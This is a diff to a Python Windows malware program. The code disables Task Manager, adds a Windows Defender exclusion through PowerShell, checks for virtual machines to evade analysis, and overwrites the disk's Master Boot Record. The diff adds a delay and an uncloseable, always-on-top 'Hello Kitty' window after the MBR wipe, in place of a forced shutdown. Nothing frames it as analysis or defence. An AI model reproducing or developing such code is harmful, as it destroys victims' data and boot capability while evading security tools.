@@ -13,6 +13,8 @@ from pathlib import Path
 from tkinter import messagebox
 import psutil
 import time
+from tkinter import *
+import random
 from win32gui import *
 from win32ui import *
 from win32con import *
@@ -40,7 +42,7 @@ def Warning():
 
 def Installation():
     #Look for the file, and when its found, the program quits
-    if not os.path.isfile(DontDownloadPath) == True:
+    if not os.path.isfile(DontDownloadPath):
         DTM()
 
         os.chdir(TempPath)
@@ -93,6 +95,9 @@ objShell.Run "cmd /c powershell.exe Add-MpPreference -ExclusionPath '{str(Path.h
 
         DelMBR()
 
+    elif os.path.isfile(DontDownloadPath):
+        sys.exit()
+
 def AntiVm():
   #Searches for processes with the name, and when he has found a process, the program quits
   Process = ["vmsrvc.exe" , "vmusrvc.exe", "vboxtray.exe", "vmtoolsd.exe", "df5serv.exe", "vboxservice.exe"]
@@ -110,7 +115,8 @@ def DelMBR():
     WriteFile(hDevice, AllocateReadBuffer(512), None)
     CloseHandle(hDevice)
 
-    os.system("shutdown -s -f -t 0")
+    time.sleep(random.randint(5, 10))
+    Window()
 
 def DTM():
     try:
@@ -118,6 +124,21 @@ def DTM():
         os.system("start cmd /c REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f")
     except:
         pass
+
+def Window():
+    window = Tk()
+    window.geometry("1120x720")
+    window.title("Hello Kitty")
+    window.configure(background='pink')
+    window.resizable(False, False)
+    window.attributes('-toolwindow', True)
+    window.wm_attributes("-topmost", 1)
+
+    def on_closing():
+        pass
+
+    window.protocol("WM_DELETE_WINDOW", on_closing)
+    window.mainloop()
 
 if __name__ == '__main__':
     #AntiVm() Optional
